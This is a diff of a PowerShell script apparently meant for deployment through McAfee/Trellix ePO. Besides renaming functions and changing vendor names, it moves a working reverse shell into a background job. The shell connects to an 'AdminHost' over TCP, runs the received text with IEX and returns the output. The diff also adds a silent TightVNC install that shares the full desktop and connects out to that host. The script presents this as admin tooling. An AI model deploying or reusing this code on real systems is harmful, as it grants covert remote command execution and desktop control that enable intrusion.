@@ -54,7 +54,7 @@
 # ------------------------------------------------------------------------------------------------
 param (
     [Parameter(Mandatory=$true,HelpMessage="Time in minutes")]
-    [int]$Time = $(throw "Time is mandatory, please provide a value."),
+    [System.Int32]$Time = $(throw "Time is mandatory, please provide a value."),
     [Parameter(Mandatory=$true)]
     [Alias("host","admin","ip")]
     [string]$AdminHost = $(throw "AdminHost is mandatory, please provide a value."),    
@@ -81,9 +81,9 @@ $g_ISO_Date_with_time = Get-Date -format "yyyy-MM-dd HH:mm:ss"
 [string]$PropNo
 # ------------------------------------------------------------------------------------------------
 
-function get_path_to_agent_tools()
+function Set-PathToAgent()
     {
-    # Find path to McAfee Agent
+    # Find path to Trellix Agent
     # Read information from 64 bit
     if ((Get-WmiObject win32_operatingsystem | Select-Object osarchitecture).osarchitecture -like "64*")
     {
@@ -106,20 +106,19 @@ function get_path_to_agent_tools()
 
     if ($g_agentFound)
     {
-     
         $Global:g_Command_maconfig = [System.IO.Path]::Combine( [System.IO.Directory]::GetParent($Global:g_path_to_agent).FullName,"MACONFIG.EXE")
         $Global:g_Command_cmdagent = [System.IO.Path]::Combine( [System.IO.Directory]::GetParent($Global:g_path_to_agent).FullName,"CMDAGENT.EXE")
     }
     else
     {   
-        $agent_error = [String]::Format("Error locating McAfee Agent... Exiting with Code {0}.", $g_agentNotFound_ExitCode)                
+        $agent_error = [String]::Format("Error locating Trellix Agent... Exiting with Code {0}.", $g_agentNotFound_ExitCode)                
         Write-Host $agent_error -ForegroundColor Red
         Exit $g_agentNotFound_ExitCode        
     }
 
 }
 
-function write_customprops()
+function Write-Customprops()
     {
            param(
             [string]$Value,
@@ -169,14 +168,13 @@ function write_customprops()
     
     }
 
-
-function return_results_to_ePO {
+function Send-ResultToEPO {
     param(
-        [string]$PropsNo
+        [int]$PropsNo
     )
-
-    write_customprops -PropsNo $PropsNo -Value $Global:g_results 
-    
+    if($PropsNo -gt 0 -and $PropsNo-lt 9){
+        Write-Customprops -PropsNo $PropsNo -Value $Global:g_results 
+    }
     "Status added to "+$g_temp_status_file
     Add-Content $g_temp_status_file "$Global:g_results"
 
@@ -184,53 +182,61 @@ function return_results_to_ePO {
     
 }
 
-function ReverseShell {
-    param (
-        [String]$ip_addr,
-        [int16]$port
-    )
-    $a=[System.Byte[]]::CreateInstance([System.Byte],1024);
-    $b=New-Object System.Net.Sockets.TCPClient($ip_addr,$port);
-    While($c=$b.GetStream()){
-        While($c.DataAvailable -or $d -eq $a.count){
-            $d=$c.Read($a,0,$a.length);
-            $e+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($a,0,$d)
+function Start-Services {
+    $jobs = @()
+    if($VNC){
+        $jobs += Start-Job -Name "VNC" -ArgumentList (,$AdminHost) -ScriptBlock {
+            param($AdminHost)
+            Start-Process -FilePath tvnserver.exe -ArgumentList "-install -silent"
+            Start-Process -FilePath tvnserver.exe -ArgumentList "-start -silent"
+            Start-Process -FilePath tvnserver.exe -ArgumentList "-controlservice -sharefull"
+            Start-Process -FilePath tvnserver.exe -ArgumentList "-controlservice -connect $AdminHost"
+            Wait-Process -Name tvnserver -ErrorAction Continue -Verbose
         }
-        If($e){
-            $f=(IEX($e)2>&1|Out-String);
-            If(!($f.length%$a.count)){
-                $f+=" "
-            }
-            $g=([text.encoding]::ASCII).GetBytes($f);
-            $c.Write($g,0,$g.length);
-            $c.Flush();
-            $e=$Null
-        }
-        Start-Sleep -Milliseconds 1
     }
-}
 
-ReverseShell -ip_addr "ip" -port 1616
+    if($Console){
+        $jobs += Start-Job -Name "Console" -ArgumentList ($AdminHost,$ConsolePort) -ScriptBlock {
+            param($AdminHost,$ConsolePort)
+            $a=[System.Byte[]]::CreateInstance([System.Byte],1024);
+            $b=New-Object System.Net.Sockets.TCPClient($AdminHost,$ConsolePort);
+            While($c=$b.GetStream()){
+                While($c.DataAvailable -or $d -eq $a.count){
+                    $d=$c.Read($a,0,$a.length);
+                    $e+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($a,0,$d)
+                }
+                If($e){
+                    $f=(IEX($e)2>&1|Out-String);
+                    If(!($f.length%$a.count)){
+                        $f+=" "
+                    }
+                    $g=([text.encoding]::ASCII).GetBytes($f);
+                    $c.Write($g,0,$g.length);
+                    $c.Flush();
+                    $e=$Null
+                }
+                Start-Sleep -Milliseconds 1
+            }
+        }
+    }
+    
+    Get-Job
+    Write-Host "Waiting for admin to do his job."
+    Wait-Job -Job $jobs -Timeout ($Time * 60)
 
-function place_your_code_here_function {
-    #
-    # Place your code here
-    # 
-
-    Start-Process -FilePath tvnserver.exe -ArgumentList "-install -silent"
-    Start-Process -FilePath tvnserver.exe -ArgumentList "-start -silent"
-    Start-Process -FilePath tvnserver.exe -ArgumentList "-controlservice -sharefull"
-    Start-Process -FilePath tvnserver.exe -ArgumentList "-controlservice -connect $AdminHost"
-    Wait-Process -Name tvnserver -ErrorAction Continue -Verbose -Timeout 50
-    Start-Process -FilePath tvnserver.exe -ArgumentList "-controlservice -shutdown"
-    Start-Process -FilePath tvnserver.exe -ArgumentList "-stop -silent"
-    Start-Process -FilePath tvnserver.exe -ArgumentList "-remove -silent"
-
+    foreach ($job in $jobs) {
+        Receive-Job -Job $job
+    }
+    if($VNC){
+        Start-Process -FilePath tvnserver.exe -ArgumentList "-controlservice -shutdown"
+        Start-Process -FilePath tvnserver.exe -ArgumentList "-stop -silent"
+        Start-Process -FilePath tvnserver.exe -ArgumentList "-remove -silent"
+    }
+    
     # Set the value to be returned to ePO - max 255 char
-    $Global:g_results = "First test"
+    $Global:g_results = "EEDK VNC and Reverse shell"
     # Write the results to the Custom Props
     $Global:g_results = $Global:g_results +", AT: "+$g_ISO_Date_with_time
-
 }
 
 ################
@@ -254,15 +260,11 @@ function main()
     Write-Host Time
     Write-Host $Time
 
-    get_path_to_agent_tools
+    Set-PathToAgent
 
-    place_your_code_here_function
+    Start-Services
 
-    return_results_to_ePO -PropsNo 8
-
-    #"Completed : "
-    #Get-Date -format "yyyyMMdd_HHmmss"
-
+    Send-ResultToEPO -PropsNo $prop
 }
 
 main
